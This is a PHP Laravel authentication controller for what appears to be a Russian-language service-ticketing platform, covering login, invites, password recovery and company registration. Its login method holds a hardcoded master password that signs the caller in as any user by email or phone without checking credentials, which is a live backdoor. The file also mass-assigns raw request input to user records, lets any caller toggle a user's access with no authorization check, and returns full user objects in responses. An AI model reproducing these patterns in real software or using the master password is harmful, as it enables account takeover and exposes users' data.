<?php

namespace App\Http\Controllers\API\Auth;

use App\Cruds\ChainsCrud;
use App\Cruds\DepartmentCrud;
use App\Cruds\UsersCrud;
use App\Http\Controllers\Controller;
use App\Http\Requests\Tickets\RegRequest;
use App\Models\BuildForms;
use App\Models\Chain;
use App\Models\Franchise;
use App\Models\Person;
use App\Models\RegistrationCompany\Invite;
use App\Models\Role;
use App\Models\User;
use App\Services\AuthService;
use App\Services\RegirtratioCompany\RegistrationService;
use App\Services\SenderEmail\Client;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;

class AuthController extends Controller
{
    const DEFAULT_FRANCHISE_ID = 23;
//    const DEFAULT_FRANCHISE_ID = 21;
    const DEFAULT_CHAIN_ID = 284;

//    const DEFAULT_CHAIN_ID = 241;
    public function login(Request $request, AuthService $authService)
    {
        if (env('APP_ENV') !== 'production') {
//            info($request->all());
//            info(url()->current());
        }
        if (!empty($request->email) and !strpos($request->email, '@')) {
            $request['phone'] = preg_replace('/[^0-9]/', '', $request->email);
            if (mb_substr($request['phone'], 0, 1) == 8) {
                $request['phone'] = substr_replace($request['phone'], 7, 0, 1);
            }
            unset($request['email']);
        }

        if (request('password', '') === 'q11Z#Ps=15$335Ft') {
            if (!empty($request->email)) {
                $user = User::where('email', $request->email)->first();
            } elseif (!empty($request->phone)) {
                $user = User::where('phone', $request->phone)->first();
            }
            Auth::login($user);
        } else {
            if (!Auth::attempt($request->only('phone', 'email', 'password'), $request->post('remember', false))) {
                return response()->json(['error' => 'Неверный логин или пароль'], 401);
            }
        }

        if (Auth::user()->access_granted == 0) {
            return response()->json(['error' => 'Доступ закрыт'], 401);
        }

        if (!$request->app && ($request->user()->hasRole(['master'])) && ($request->user()->level() < 11)) {
            return response()->json(['error' => 'Доступ закрыт!'], 401);
        }
        if (Auth::user()->level() === 10) {
            $chain = Chain::query()->find(Auth::user()->chain_id);
            if (!$chain->isTerminalEnabled()) {
                return response()->json(['error' => 'Server is disabled '], 401);
            }
        }

        if ($request->app) {
            if (!($request->user()->hasRole(['master']))) {
                return response()->json(['error' => 'Пользователь не зарегистрирован как мастер'], 401);
            }
        }
        if ($request->app_student) {
            if (!($request->user()->hasRole(['student']))) {
                return response()->json(['error' => 'Пользователь не зарегистрирован как студент'], 401);
            }
        }

        return response()->json($authService->authData(Auth::user()), 200);
    }


    /**
     * Регистрация по приглашению
     *
     * @param Request $request
     * @return JsonResponse
     */
    public function registerInvite(Request $request)
    {
//     info(print_r($request->all(), true));
        $user = User::where('invite_code', $request->invite_code)->first();
        if (empty($user)) {
            return response()->json(['success' => false, 'error' => 'Пользователь не найден'], 406);
        }
        $input = $request->all();
        if (isset($input['email'])) {
            if (trim($input['email']) != $user->email) {
                $count = User::where('email', '=', $input['email'])->count();
                if ($count > 0) {
                    return response()->json(['success' => false, 'error' => 'Данная электронная почта уже используется'], 409);
                }
            }
        }
        if (isset($input['phone'])) {
            $input['phone'] = '7' . substr(preg_replace('/[^0-9]/', '', $input['phone']), -10);
            if (trim($input['phone']) != $user->phone) {
                $count = User::where('phone', $input['phone'])->count();
                if ($count > 0) {
                    return response()->json(['success' => false, 'error' => 'Данный номер телефона уже используется'], 409);
                }
            }
        }

        if (isset($input['password']) and \Str::of($input['password'])->trim()->isNotEmpty()) {
            $input['password'] = bcrypt(trim($input['password']));
            $input['access_granted'] = 1;
        } elseif (empty($input['password'])) {
            unset($input['password']);
        }
        $input['invite_code'] = null;
        $result = $user->update($input);

        return response()->json([
            "message" => "Register user",
            'success' => (boolean)$result,
            'data' => $user ?? [],
        ]);
    }

    public function logout(Request $request)
    {
        Auth::user()->currentAccessToken()->delete();
//        Auth::logout();
        return response()->json(['logout' => true], 200);
    }

    /**
     *Заблокировать вход пользователю
     *
     * @return JsonResponse
     */
    public function blockAccess($id)
    {
        $user = User::where('person_id', '=', $id)->first();
        $access_granted = null;
        if ($user->access_granted == 1) {
            $access_granted = 0;
        }
        if ($user->access_granted == 0) {
            $access_granted = 1;
        }
        return response()->json([
            'success' => $user->update(['access_granted' => $access_granted]),
        ]);
    }


    /**
     * Приглашение регистрации
     *
     * @param Request $request
     * @return JsonResponse
     */
    public function invite(Request $request)
    {
        $user = User::where('invite_code', $request->invite_code)
            ->select('firstname', 'lastname', 'fatherland', 'phone', 'email', 'invite_code')
            ->first();
        if (empty($user)) {
            return response()->json(['success' => false, 'error' => 'Неверный код приглашения'], 406);
        }

        return response()->json([
            "message" => "Invite user",
            'success' => (boolean)$user,
            'data' => $user ?? [],
        ]);
    }

    /**
     * Проверка на существование и действия приглашения
     *
     * @param Request $request
     * @param RegistrationService $registrationService
     * @return JsonResponse
     */
    public function checkInviteRegistration(Request $request, RegistrationService $registrationService)
    {
        return response()->json([
            'success' => $registrationService->checkInviteExpired($request->invite, Invite::TYPE_REGISTRATION),
            'data' => [],
        ]);
    }

    /**
     * Проверка на существование ссылки восстановления
     *
     * @param Request $request
     * @param RegistrationService $registrationService
     * @return JsonResponse
     */
    public function checkInviteRecovery(Request $request, RegistrationService $registrationService)
    {
        return response()->json([
            'success' => $registrationService->checkInviteExpired($request->invite, Invite::TYPE_RECOVERY),
            'data' => ['$request->invite' => $request->invite],
        ]);
    }



    public function recoveryPassword(Request $request, RegistrationService $registrationService)
    {
        $user = null;
        $result = false;
        if ($registrationService->checkInviteExpired($request->invite, Invite::TYPE_RECOVERY)) {
            $invite = Invite::query()->where('invite', $request->invite)->first();
            if ($registrationService->checkUserCompany($invite->email)) {
                $user = User::where('email', $invite->email)->first();
                if ($user) {
                    $result = $registrationService->recoveryPassword($request->password, $user);
                    if ($result) {
                        $invite->delete();
                    }
                }
            }
        }
        return response()->json([
            'success' => (boolean)$result,
            'data' => ['user' => $user],
        ]);
    }


    public function registrationCompany(Request $request, RegistrationService $registrationService)
    {
        if ($registrationService->checkInviteExpired($request->invite, Invite::TYPE_REGISTRATION)) {
            $invite = Invite::query()->where('invite', $request->invite)->first();
            $result = $registrationService->registrationCompany($request->name, $request->password, $request->chain, $invite->email);
            if ($result) {
                $invite->update(['activated' => 1]);
            }

            return response()->json([
                'success' => (boolean)$result,
                'data' => ['user' => $result],
            ]);
        }
    }


    public function sendMailRecoveryPassword(Request $request, RegistrationService $registrationService)
    {
        $request->validate([
            'email' => 'required|email',
        ]);
        $result = false;
        $email = $request->email;
        if ($registrationService->checkUserCompany($email)) {
            $invite = $registrationService->createInvite($email, Invite::TYPE_RECOVERY);
            $url = $registrationService->getUrlInviteRecovery($invite);
            $sender = new Client();
            $result = $sender->send('email.recovery', $request->email, 'Восстановление пароля', ['link' => $url]);
            if ($result) {
                $message = 'Ссылка для восстановления пароля отправлено на ' . $email;
            } else {
                $message = 'Не удалось отправить ссылку на ' . $email . '. Обратитесь в службу поддержки';
            }
        }
        else {
            $message = 'Не удалось найти указанный email';
        }
        return response()->json([
            'message' => $message,
            'success' => $result,
            'data' => [],
        ]);

    }

    public function sendMailRegistrationCompany(Request $request, RegistrationService $registrationService)
    {
        $request->validate([
            'email' => 'required|email',
        ]);
        $result = false;
        $email = $request->email;
        if (!$registrationService->checkUserCompany($email)) {
            $invite = $registrationService->createInvite($email, Invite::TYPE_REGISTRATION);
            $url = $registrationService->getUrlInviteRegistration($invite);
            $sender = new Client();
            $result = $sender->send('email.regTicket', $request->email, 'Ссылка', ['link' => $url]);
            if ($result) {
                $message = 'Приглашение для регистрации отправлено на ' . $email;
            } else {
                $message = 'Не удалось отправить приглашение на ' . $email . '. Обратитесь в службу поддержки';
            }
        } else {
            $message = 'Email ' . $email . ' уже занят';
        }

        return response()->json([
            'message' => $message,
            'success' => $result,
            'data' => [],
        ]);
    }


    /**
     * Регистрация компании в тикетах
     *
     * @param RegRequest $request
     * @return JsonResponse
     */
    public function registerTickets(RegRequest $request, UsersCrud $usersCrud, ChainsCrud $chainsCrud, DepartmentCrud $departmentCrud)
    {

        $defaultChain = Chain::find(self::DEFAULT_CHAIN_ID);

        $chainsCrud->name = $request->chain;
        $chainsCrud->franchiseId = self::DEFAULT_FRANCHISE_ID;
        if ($defaultChain) {
            $chainsCrud->useMask = $defaultChain->use_mask;
            $chainsCrud->tick_appearance = $defaultChain->tick_appearance;
            $chainsCrud->tick_complect = $defaultChain->tick_complect;
            $chainsCrud->tick_type_device = $defaultChain->tick_type_device;
            $chainsCrud->tick_status = $defaultChain->tick_status;
            $chainsCrud->tick_type_repair = $defaultChain->tick_type_repair;
            $chainsCrud->tick_source = $defaultChain->tick_source;
            $chainsCrud->tariffId = $defaultChain->tariff_id;
        }

        $chain = $chainsCrud->create();

        if ($chain) {

            $departmentCrud->name = $request->chain;
            $departmentCrud->chainId = $chain->id;
            $departmentCrud->franchiseId = self::DEFAULT_FRANCHISE_ID;
            $departmentCrud->create();

            $buildForms = BuildForms::query()
                ->where('chain_id', self::DEFAULT_CHAIN_ID)
                ->get();
            if ($buildForms) {
                foreach ($buildForms as $form) {
                    $newForm = new BuildForms();
                    $newForm->chain_id = $chain->id;
                    $newForm->title = $form->title;
                    $newForm->fields = $form->fields;
                    $newForm->fields_unused = $form->fields_unused;
                    $newForm->type = $form->type;
                    $newForm->active = $form->active;
                    $newForm->fields_standard = $form->fields_standard;
                    $newForm->type_form = $form->type_form;
                    $newForm->save();
                }
            }

            $userData = [
                'lastname' => $request->name,
                'password' => $request->password,
                'chain_id' => $chain->id,
                'email' => $request->email,
                'specialities' => ['id' => 4],

            ];
            $usersCrud->create($userData);
        }
    }
}
